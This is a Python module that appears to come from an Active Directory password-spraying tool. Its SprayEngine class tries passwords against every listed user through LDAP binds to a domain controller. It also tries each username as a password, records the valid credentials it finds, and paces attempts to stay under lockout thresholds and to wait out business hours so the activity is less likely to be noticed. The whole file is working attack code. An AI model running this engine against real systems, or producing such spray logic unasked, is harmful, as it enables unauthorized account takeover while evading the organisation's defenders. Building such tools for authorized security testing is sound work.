"""Spray engine for executing password spray attacks."""

import atexit
import shutil
import signal
import sys
import time
from datetime import datetime, timedelta
from pathlib import Path
from typing import Optional, TextIO

from .constants import (
    Colors,
    strip_colors,
    ERROR_SUCCESS,
    ERROR_NO_SUCH_USER,
    ERROR_ACCOUNT_DISABLED,
    ERROR_PASSWORD_EXPIRED,
    ERROR_PASSWORD_MUST_CHANGE,
    ERROR_ACCOUNT_LOCKED_OUT,
    ERROR_ACCOUNT_EXPIRED,
    ERROR_HOST_UNREACHABLE,
    ERROR_GEN_FAILURE,
)
from .ldap import check_auth
from .models import Attempt, SpraySession
from .policy import password_meets_policy, password_contains_username
from .scheduling import TimeVerifier, format_schedule_display
from .storage import SessionStore, AttemptRecord


class SprayEngine:
    """Engine for executing password spray attacks."""

    def __init__(
        self,
        session: SpraySession,
        session_path: Path,
        verbose: int = 3,
        time_verifier: Optional[TimeVerifier] = None
    ):
        self.session = session
        self.session_path = session_path
        self.verbose = verbose
        self.time_verifier = time_verifier or TimeVerifier(force_system_time=True, verbose=verbose)
        self.paused = False
        self.stopped = False
        self.consecutive_lockouts = 0
        self._pause_requested = False  # Flag for async signal handler

        # Session store for efficient I/O
        self._store = SessionStore(session_path, session.config.session_id)

        # Log file for detailed output
        self._log_file: Optional[TextIO] = None

        # Status bar tracking
        self._is_tty = sys.stderr.isatty() and sys.stdin.isatty()
        self._status_bar_enabled = self._is_tty and verbose > 0
        self._status_bar_active = False  # Track if status bar is set up
        self._terminal_rows = 24
        self._start_time: Optional[datetime] = None
        self._total_passwords = 0
        self._current_password_num = 0

        # Set up signal handlers
        signal.signal(signal.SIGINT, self._handle_interrupt)

        # Get terminal size
        if self._status_bar_enabled:
            try:
                size = shutil.get_terminal_size()
                self._terminal_rows = size.lines
            except Exception:
                pass

    def _setup_status_bar(self):
        """Reserve the bottom line for status bar."""
        if not self._status_bar_enabled:
            return
        try:
            # Scroll region excludes bottom line, move cursor up
            sys.stderr.write(f"\033[1;{self._terminal_rows - 1}r")  # Set scroll region
            sys.stderr.write(f"\033[{self._terminal_rows - 1};1H")   # Move to line above status
            sys.stderr.flush()
            self._status_bar_active = True
            # Register cleanup as safety net for abnormal exits
            atexit.register(self._cleanup_status_bar)
        except Exception:
            # If terminal setup fails, disable status bar
            self._status_bar_enabled = False
            self._status_bar_active = False

    def _cleanup_status_bar(self):
        """Restore terminal to normal state."""
        if not self._status_bar_active:
            return
        self._status_bar_active = False
        try:
            # Unregister atexit handler since we're cleaning up normally
            atexit.unregister(self._cleanup_status_bar)
        except Exception:
            pass
        try:
            # Reset scroll region to full screen
            sys.stderr.write(f"\033[1;{self._terminal_rows}r")
            # Clear status line
            sys.stderr.write(f"\033[{self._terminal_rows};1H\033[2K")
            # Move cursor to end of content area
            sys.stderr.write(f"\033[{self._terminal_rows - 1};1H")
            sys.stderr.flush()
        except Exception:
            pass  # Best effort cleanup

    def _update_status_bar(self, credential: str = "", extra: str = ""):
        """Update the status bar at bottom of terminal."""
        if not self._status_bar_active:
            return

        try:
            # Calculate ETA
            eta_str = self._calculate_eta_string()

            # Add schedule status if enabled
            schedule_str = ""
            if self.session.schedule.is_enabled():
                current_time = self.time_verifier.get_current_time(self.session.schedule.timezone)
                is_business, should_pause = self.session.schedule.get_current_status_with_time(current_time)
                if should_pause:
                    schedule_str = f" | {Colors.RED}PAUSED (schedule){Colors.NC}"
                elif is_business:
                    schedule_str = f" | {Colors.ORANGE}Business hours{Colors.NC}"

            # Build status line
            if extra:
                status = f" {Colors.LBLUE}[{extra}]{Colors.NC} | {eta_str}{schedule_str}"
            elif credential:
                status = f" {Colors.LBLUE}Testing:{Colors.NC} {credential} | {eta_str}{schedule_str}"
            else:
                status = f" {eta_str}{schedule_str}"

            # Save cursor, move to bottom line, clear it, print status, restore cursor
            # Using portable escape sequences
            sys.stderr.write("\033[s")  # Save cursor position
            sys.stderr.write(f"\033[{self._terminal_rows};1H")  # Move to bottom line
            sys.stderr.write("\033[2K")  # Clear line
            sys.stderr.write(f"{Colors.ORANGE}{status}{Colors.NC}")
            sys.stderr.write("\033[u")  # Restore cursor position
            sys.stderr.flush()
        except Exception:
            pass  # Best effort - don't crash on status bar issues

    def _calculate_eta_string(self) -> str:
        """Calculate and format the ETA string."""
        if not self._start_time or self._total_passwords == 0:
            return "ETA: calculating..."

        passwords_remaining = self._total_passwords - self._current_password_num
        if passwords_remaining <= 0:
            return "ETA: completing..."

        safe_attempts = self.session.attempts_allowed  # Base for ETA (non-business hours)
        sleep_time = self.session.get_sleep_time_seconds()

        # Calculate remaining sleep cycles
        if safe_attempts <= 0 or sleep_time == 0:
            # No lockout policy - estimate based on elapsed time
            elapsed = (datetime.now() - self._start_time).total_seconds()
            if self._current_password_num > 0:
                time_per_password = elapsed / self._current_password_num
                remaining_seconds = int(passwords_remaining * time_per_password)
            else:
                return "ETA: calculating..."
        else:
            # Calculate based on sleep cycles
            remaining_sleeps = passwords_remaining // safe_attempts
            remaining_seconds = remaining_sleeps * sleep_time

            # Add estimate for actual spray time (rough: 1 sec per user per password)
            users_active = len(self.session.users) - len(self.session.skipped_users)
            remaining_seconds += passwords_remaining * users_active * 1

        # Format the ETA
        eta_time = datetime.now() + timedelta(seconds=remaining_seconds)

        if remaining_seconds < 60:
            time_str = f"{remaining_seconds}s"
        elif remaining_seconds < 3600:
            time_str = f"{remaining_seconds // 60}m {remaining_seconds % 60}s"
        else:
            hours = remaining_seconds // 3600
            mins = (remaining_seconds % 3600) // 60
            time_str = f"{hours}h {mins}m"

        return f"ETA: {eta_time.strftime('%H:%M:%S')} ({time_str} remaining) | {self._current_password_num}/{self._total_passwords} passwords"

    def _handle_interrupt(self, signum, frame):
        """
        Handle Ctrl+C signal - sets flag for main loop to check.

        Does NOT call input() here to avoid deadlocks. Instead, sets
        _pause_requested flag which is checked in _check_pause().
        """
        if self._pause_requested or self.paused:
            # Second Ctrl+C - stop immediately
            self.stopped = True
            self.paused = False
            self._pause_requested = False
        else:
            # First Ctrl+C - request pause
            self._pause_requested = True

    def _check_pause(self):
        """
        Check if pause was requested and handle it.

        Call this from the main loop to safely handle pause requests.
        This is where we can safely call input() since we're in the main thread.
        """
        if not self._pause_requested:
            return

        self._pause_requested = False
        self.paused = True

        self._print(f"\n{Colors.ORANGE}[+] Spray paused.{Colors.NC}", level=1)
        self._print(f"{Colors.ORANGE}[+] Press{Colors.NC} Ctrl+C {Colors.ORANGE}again to quit.{Colors.NC}", level=1)
        self._print(f"{Colors.ORANGE}[+] Press{Colors.NC} Enter {Colors.ORANGE}to continue.{Colors.NC}", level=1)

        if self._is_tty:
            try:
                input()
                self.paused = False
                self._print(f"{Colors.ORANGE}[+] Spray resumed.{Colors.NC}", level=1)
            except EOFError:
                self.stopped = True
        else:
            # Non-TTY: treat pause request as stop
            self.stopped = True

    def _open_log_file(self):
        """Open the session log file for writing."""
        if self._log_file is None:
            self._log_file = open(self._store.log_path, 'a', encoding='utf-8')

    def _close_log_file(self):
        """Close the session log file."""
        if self._log_file is not None:
            self._log_file.close()
            self._log_file = None

    def _log(self, message: str, end: str = "\n"):
        """Write message to log file (colors stripped)."""
        if self._log_file is not None:
            self._log_file.write(strip_colors(message) + end)
            self._log_file.flush()

    def _print(self, message: str, level: int = 3, end: str = "\n", screen: bool = True, log: bool = True):
        """Print message based on verbosity and output routing.

        Args:
            message: The message to print
            level: Verbosity level required (0=always, 1=important, 2=info, 3=verbose)
            end: Line ending
            screen: Whether to output to screen (stderr)
            log: Whether to output to log file
        """
        if self.verbose >= level:
            if screen:
                print(message, end=end, file=sys.stderr, flush=True)
            if log:
                self._log(message, end)

    def _save_session(self):
        """Save current session state."""
        from .session import save_session
        save_session(self.session, self.session_path)

    def _write_success(self, username: str, password: str, status: str):
        """Write successful credential to custom output file (if configured)."""
        # Note: valid_creds.txt in session dir is now handled by storage module
        output_file = self.session.config.output_file
        if not output_file:
            return

        suffix = "" if status == ERROR_SUCCESS else f" # {status.replace('ERROR_', '')}"

        with open(output_file, "a") as f:
            f.write(f"{username}:{password}{suffix}\n")

    def _check_credential(self, username: str, password: str) -> str:
        """Check a single credential against AD. Returns the error code."""
        config = self.session.config
        result = check_auth(
            dc_host=config.dc_host,
            username=username,
            password=password,
            workgroup=config.workgroup,
            use_ssl=config.use_ssl,
            port=config.port,
        )
        return result["status"]

    def _wait_for_business_hours_end(self):
        """Wait until business hours end if currently in business hours with reduced attempts <= 0."""
        if not self.session.schedule.is_enabled():
            return

        while not self.stopped:
            # Use verified time for schedule checks
            safe_attempts = self.session.get_safe_attempts_per_window(
                time_verifier=self.time_verifier
            )

            if safe_attempts > 0:
                # Can proceed with reduced attempts
                return

            current_time = self.time_verifier.get_current_time(self.session.schedule.timezone)
            is_business, should_pause = self.session.schedule.get_current_status_with_time(current_time)

            if not is_business and not should_pause:
                # Outside business hours, can proceed
                return

            # Need to wait
            wait_time = self.session.schedule.get_time_until_business_hours_end_with_time(current_time)
            if wait_time is None or wait_time <= 0:
                return

            # Cap wait time and show status
            wait_chunk = min(wait_time, 60)  # Check every minute
            hours = wait_time // 3600
            mins = (wait_time % 3600) // 60

            self._print(
                f"{Colors.ORANGE}[+] Pausing during business hours. "
                f"Resuming in ~{hours}h {mins}m...{Colors.NC}",
                level=1, screen=False
            )
            self._update_status_bar(extra=f"Paused (business hours) - {hours}h {mins}m remaining")

            # Sleep in chunks to respond to interrupts
            remaining = wait_chunk
            while remaining > 0 and not self.stopped:
                self._check_pause()
                if self.stopped:
                    return
                chunk = min(remaining, 1)
                time.sleep(chunk)
                remaining -= chunk

    def run(self) -> bool:
        """Execute the spray. Returns True if completed successfully."""
        config = self.session.config
        policy = self.session.policy

        # Open log file for detailed output
        self._open_log_file()

        # Display time verification status (log only)
        self._print(f"{Colors.ORANGE}[+] Time Verification{Colors.NC}", level=1, screen=False)
        self._print(f"{Colors.BLUE}[+]     Time Source:{Colors.NC} {self.time_verifier.source}", level=1, screen=False)

        if self.session.schedule.is_enabled():
            current_time = self.time_verifier.get_current_time(self.session.schedule.timezone)
            self._print(f"{Colors.BLUE}[+]   Current Time:{Colors.NC} {current_time.strftime('%Y-%m-%d %H:%M:%S %Z')}", level=1, screen=False)
        else:
            current_time = self.time_verifier.get_current_time()
            self._print(f"{Colors.BLUE}[+]   Current Time:{Colors.NC} {current_time.strftime('%Y-%m-%d %H:%M:%S')} UTC", level=1, screen=False)

        self._print(f"{Colors.BLUE}[+] ---------------{Colors.NC}", level=1, screen=False)

        # Display schedule information if enabled (log only)
        if self.session.schedule.is_enabled():
            self._print(f"{Colors.ORANGE}[+] Business Hours Schedule{Colors.NC}", level=1, screen=False)
            schedule_display = format_schedule_display(self.session.schedule, self.time_verifier)
            for line in schedule_display.split('\n'):
                self._print(f"{Colors.BLUE}[+]{Colors.NC}{line}", level=1, screen=False)
            self._print(f"{Colors.BLUE}[+] ---------------{Colors.NC}", level=1, screen=False)

        safe_attempts = self.session.attempts_allowed  # Base for display (non-business hours)
        sleep_time = self.session.get_sleep_time_seconds()

        # Check if spraying is even possible
        if safe_attempts <= 0:
            self._print(
                f"{Colors.RED}[!] Cannot spray: attempts_allowed is 0{Colors.NC}",
                level=1
            )
            return False

        # Filter passwords that don't meet policy (length + complexity categories)
        # Note: username-in-password check is done per-user during spraying
        valid_passwords = []
        for pwd in self.session.passwords:
            if pwd in self.session.skipped_passwords:
                continue
            meets, reason = password_meets_policy(pwd, self.session.policy)  # No username here
            if not meets:
                self._print(
                    f"{Colors.ORANGE}[!] Skipping password '{pwd}' - {reason}{Colors.NC}",
                    level=2, screen=False
                )
                self.session.skipped_passwords.add(pwd)
                continue
            valid_passwords.append(pwd)

        total_users = len(self.session.users) - len(self.session.skipped_users)
        total_passwords = len(valid_passwords)
        total_attempts = total_users * total_passwords

        # Print configuration (log only)
        self._print(f"{Colors.ORANGE}[+] Spray Configuration{Colors.NC}", level=1, screen=False)
        self._print(f"{Colors.BLUE}[+]         Session:{Colors.NC} {config.session_id}", level=1, screen=False)
        self._print(f"{Colors.BLUE}[+]         DC Host:{Colors.NC} {config.dc_host}", level=1, screen=False)
        self._print(f"{Colors.BLUE}[+]       Workgroup:{Colors.NC} {config.workgroup}", level=1, screen=False)
        self._print(f"{Colors.BLUE}[+]    User as Pass:{Colors.NC} {config.user_as_pass}", level=1, screen=False)
        self._print(f"{Colors.BLUE}[+] ---------------{Colors.NC}", level=1, screen=False)
        self._print(f"{Colors.BLUE}[+]   Spray Timing{Colors.NC}", level=1, screen=False)
        self._print(f"{Colors.BLUE}[+]       Attempts:{Colors.NC} {self.session.attempts_allowed} per window", level=1, screen=False)
        self._print(f"{Colors.BLUE}[+]  Lockout Window:{Colors.NC} {self.session.lockout_window} min", level=1, screen=False)
        if self.session.schedule.is_enabled():
            self._print(f"{Colors.BLUE}[+]  Business hrs:{Colors.NC} {self.session.attempts_allowed_business} attempts", level=1, screen=False)
        self._print(f"{Colors.BLUE}[+] ---------------{Colors.NC}", level=1, screen=False)
        self._print(f"{Colors.BLUE}[+]  Password Filter{Colors.NC}", level=1, screen=False)
        self._print(f"{Colors.BLUE}[+]    Min Pwd Len:{Colors.NC} {policy.min_password_length}", level=1, screen=False)
        self._print(f"{Colors.BLUE}[+]    Complexity:{Colors.NC} {'Enabled' if policy.complexity_enabled else 'Disabled'}", level=1, screen=False)
        self._print(f"{Colors.BLUE}[+] ---------------{Colors.NC}", level=1, screen=False)
        self._print(f"{Colors.BLUE}[+]   Spray Strategy{Colors.NC}", level=1, screen=False)
        self._print(f"{Colors.BLUE}[+]  Safe attempts:{Colors.NC} {safe_attempts} per window", level=1, screen=False)
        if sleep_time > 0:
            self._print(f"{Colors.BLUE}[+]     Sleep time:{Colors.NC} {sleep_time // 60} min", level=1, screen=False)
        else:
            self._print(f"{Colors.BLUE}[+]     Sleep time:{Colors.NC} None", level=1, screen=False)
        self._print(f"{Colors.BLUE}[+] ---------------{Colors.NC}", level=1, screen=False)
        self._print(f"{Colors.BLUE}[+]          Users:{Colors.NC} {len(self.session.users)} ({total_users} active)", level=1, screen=False)
        self._print(f"{Colors.BLUE}[+]      Passwords:{Colors.NC} {len(self.session.passwords)} ({total_passwords} valid)", level=1, screen=False)
        self._print(f"{Colors.BLUE}[+]  Est. Attempts:{Colors.NC} {total_attempts}", level=1, screen=False)

        if sleep_time > 0 and total_passwords > safe_attempts:
            num_sleeps = (total_passwords - 1) // safe_attempts
            eta_seconds = num_sleeps * sleep_time
            eta = datetime.now() + timedelta(seconds=eta_seconds)
            self._print(f"{Colors.BLUE}[+]            ETA:{Colors.NC} {eta.strftime('%Y-%m-%d %H:%M')}", level=1, screen=False)

        self._print("", level=1, screen=False)

        if self.verbose >= 1 and self._is_tty:
            try:
                input("(Press Enter to start the spray)")
            except EOFError:
                pass
            self._print("", level=1, screen=False)

        self._print(f"{Colors.ORANGE}[+] Starting password spray...{Colors.NC}", level=2, screen=False)

        # Initialize status bar tracking
        self._start_time = datetime.now()
        self._total_passwords = len(valid_passwords) + (1 if config.user_as_pass else 0)
        self._current_password_num = 0
        self._setup_status_bar()

        try:
            # Handle user-as-password first if enabled
            if config.user_as_pass and self.session.current_password_index == 0:
                # Check business hours before starting
                self._wait_for_business_hours_end()
                if self.stopped:
                    self._save_session()
                    return False

                self._current_password_num = 1
                self._update_status_bar(credential="<user>:<user>")
                self._print(f"{Colors.ORANGE}[+] Trying username as password...{Colors.NC}", level=2, screen=False)
                for username in self.session.users:
                    self._check_pause()  # Check for pause request
                    if self.stopped:
                        break
                    if username in self.session.skipped_users:
                        continue
                    meets, reason = password_meets_policy(username, self.session.policy, username)
                    if not meets:
                        self._print(
                            f"{Colors.ORANGE}[!] Skipping user '{username}' as password - {reason}{Colors.NC}",
                            level=3, screen=False
                        )
                        continue

                    self._spray_single(username, username)

                if not self.stopped:
                    self.session.attempts_since_sleep += 1
                    if self._should_sleep():
                        self._update_status_bar(extra=f"Sleeping {sleep_time // 60}m")
                        self._do_sleep(sleep_time)

            # Main password loop
            passwords_to_try = valid_passwords[self.session.current_password_index:]

            for pwd_idx, password in enumerate(passwords_to_try, start=self.session.current_password_index):
                self._check_pause()  # Check for pause request
                if self.stopped:
                    self._print(f"\n{Colors.RED}[+] Spray stopped by user.{Colors.NC}", level=1)
                    self._save_session()
                    return False

                # Check business hours before each password
                self._wait_for_business_hours_end()
                if self.stopped:
                    self._save_session()
                    return False

                # Update progress tracking
                self._current_password_num = pwd_idx + 1 + (1 if config.user_as_pass else 0)

                self._print(f"{Colors.ORANGE}[+] Spraying password:{Colors.NC} {password}", level=2, screen=False)

                for username in self.session.users:
                    self._check_pause()  # Check for pause request
                    if self.stopped:
                        break
                    if username in self.session.skipped_users:
                        continue

                    # Skip if password contains this username (complexity rule)
                    if password_contains_username(password, username, self.session.policy):
                        self._print(
                            f"{Colors.ORANGE}[!] Skipping {username}:{password} - "
                            f"password contains username{Colors.NC}",
                            level=3, screen=False
                        )
                        continue

                    self._spray_single(username, password)

                self.session.current_password_index = pwd_idx + 1
                self.session.attempts_since_sleep += 1

                # Check if we need to sleep (using current schedule-adjusted attempts)
                if self._should_sleep() and pwd_idx < len(valid_passwords) - 1:
                    self._update_status_bar(extra=f"Sleeping {sleep_time // 60}m")
                    self._do_sleep(sleep_time)

                # Periodic save
                self._save_session()

            # Mark completed
            self.session.config.completed = True
            self._save_session()

            self._print(f"\n{Colors.GREEN}[+] Spray completed successfully.{Colors.NC}", level=1)
            stats = self.session.get_stats()
            self._print(f"{Colors.GREEN}[+] Valid credentials:{Colors.NC} {stats.get(ERROR_SUCCESS, 0)}", level=1)
            self._print(f"{Colors.GREEN}[+] Disabled accounts:{Colors.NC} {stats.get(ERROR_ACCOUNT_DISABLED, 0)}", level=1)
            self._print(f"{Colors.GREEN}[+] Locked accounts:{Colors.NC} {stats.get(ERROR_ACCOUNT_LOCKED_OUT, 0)}", level=1)

        finally:
            self._cleanup_status_bar()
            self._close_log_file()

        return True

    def _should_sleep(self) -> bool:
        """Check if we should sleep before the next password."""
        # Get current safe attempts (schedule-aware with verified time)
        safe_attempts = self.session.get_safe_attempts_per_window(
            time_verifier=self.time_verifier
        )
        if safe_attempts <= 0:  # Should be paused entirely (handled elsewhere)
            return False
        return self.session.attempts_since_sleep >= safe_attempts

    def _do_sleep(self, sleep_time: int):
        """Sleep between password batches."""
        self.session.attempts_since_sleep = 0
        if sleep_time <= 0:
            return

        self._print(
            f"{Colors.ORANGE}[+] Sleeping for {sleep_time // 60} minutes to avoid lockouts...{Colors.NC}",
            level=1, screen=False
        )
        self._save_session()

        # Sleep in chunks so we can respond to interrupts and update status
        # Use monotonic time to track actual elapsed time and avoid drift
        start_time = time.monotonic()
        end_time = start_time + sleep_time
        while not self.stopped:
            self._check_pause()  # Check for pause request
            if self.stopped:
                break
            remaining = end_time - time.monotonic()
            if remaining <= 0:
                break
            mins = int(remaining) // 60
            secs = int(remaining) % 60
            self._update_status_bar(extra=f"Sleeping {mins}m {secs}s")
            time.sleep(min(remaining, 1))

        if not self.stopped:
            self._print(f"{Colors.ORANGE}[+] Resuming spray...{Colors.NC}", level=1, screen=False)

    def _spray_single(self, username: str, password: str):
        """Spray a single credential."""
        # Update status bar with current credential being tested
        self._update_status_bar(credential=f"{username}:{password}")

        # Log the attempt (log only)
        self._print(
            f"{Colors.BLUE}[+] Trying:{Colors.NC} {username}:{password} {Colors.BLUE}...{Colors.NC}",
            level=3, end="", screen=False
        )

        status = self._check_credential(username, password)
        timestamp = datetime.now().isoformat()

        # Record the attempt using append-only storage (fast)
        attempt_record = AttemptRecord(
            username=username,
            password=password,
            status=status,
            timestamp=timestamp,
        )
        self._store.append_attempt(attempt_record)

        # Also keep in memory for stats (lightweight reference)
        attempt = Attempt(
            username=username,
            password=password,
            status=status,
            timestamp=timestamp,
        )
        self.session.attempts.append(attempt)

        # Handle result based on Microsoft error codes
        if status == ERROR_SUCCESS:
            self.consecutive_lockouts = 0
            self.session.skipped_users.add(username)
            # Show valid creds on screen with full info, log just the result
            self._print(f"{Colors.GREEN}[+] VALID:{Colors.NC} {username}:{password}", level=1, log=False)
            self._print(f" {Colors.GREEN}VALID{Colors.NC}", level=1, screen=False)
            self._write_success(username, password, status)

        elif status == ERROR_ACCOUNT_DISABLED:
            self.consecutive_lockouts = 0
            self.session.skipped_users.add(username)
            self._print(f"{Colors.GREEN}[+] VALID:{Colors.NC} {username}:{password} {Colors.RED}(DISABLED){Colors.NC}", level=1, log=False)
            self._print(f" {Colors.GREEN}VALID{Colors.NC} but {Colors.RED}DISABLED{Colors.NC}", level=1, screen=False)
            self._write_success(username, password, status)

        elif status == ERROR_PASSWORD_MUST_CHANGE:
            self.consecutive_lockouts = 0
            self.session.skipped_users.add(username)
            self._print(f"{Colors.GREEN}[+] VALID:{Colors.NC} {username}:{password} {Colors.ORANGE}(MUST_CHANGE){Colors.NC}", level=1, log=False)
            self._print(f" {Colors.GREEN}VALID{Colors.NC} but {Colors.ORANGE}MUST_CHANGE{Colors.NC}", level=1, screen=False)
            self._write_success(username, password, status)

        elif status == ERROR_PASSWORD_EXPIRED:
            self.consecutive_lockouts = 0
            self.session.skipped_users.add(username)
            self._print(f"{Colors.GREEN}[+] VALID:{Colors.NC} {username}:{password} {Colors.ORANGE}(PWD_EXPIRED){Colors.NC}", level=1, log=False)
            self._print(f" {Colors.GREEN}VALID{Colors.NC} but {Colors.ORANGE}PWD_EXPIRED{Colors.NC}", level=1, screen=False)
            self._write_success(username, password, status)

        elif status == ERROR_ACCOUNT_LOCKED_OUT:
            self.session.skipped_users.add(username)
            self.consecutive_lockouts += 1
            # Log only - user sees status bar, lockouts are in log
            self._print(f" {Colors.RED}LOCKED_OUT{Colors.NC}", level=1, screen=False)

            if self.consecutive_lockouts >= 3:
                # These warnings go to screen - they're critical
                self._print(
                    f"{Colors.RED}[!] 3+ consecutive lockouts detected! This shouldn't happen.{Colors.NC}",
                    level=1
                )
                self._print(
                    f"{Colors.RED}[!] Check lockout policy settings. Pausing...{Colors.NC}",
                    level=1
                )
                self.paused = True
                self._handle_interrupt(None, None)

        elif status == ERROR_ACCOUNT_EXPIRED:
            self.consecutive_lockouts = 0
            self.session.skipped_users.add(username)
            self._print(f" {Colors.RED}ACCOUNT_EXPIRED{Colors.NC}", level=1, screen=False)

        elif status == ERROR_NO_SUCH_USER:
            self.consecutive_lockouts = 0
            self.session.skipped_users.add(username)
            self._print(f" {Colors.RED}NO_SUCH_USER{Colors.NC}", level=2, screen=False)

        elif status in (ERROR_HOST_UNREACHABLE, ERROR_GEN_FAILURE):
            # Errors go to both screen and log
            self._print(f"{Colors.RED}[!] ERROR: {status}{Colors.NC}", level=1)

        else:  # ERROR_LOGON_FAILURE or other
            self.consecutive_lockouts = 0
            self._print(f" {Colors.RED}INVALID{Colors.NC}", level=3, screen=False)
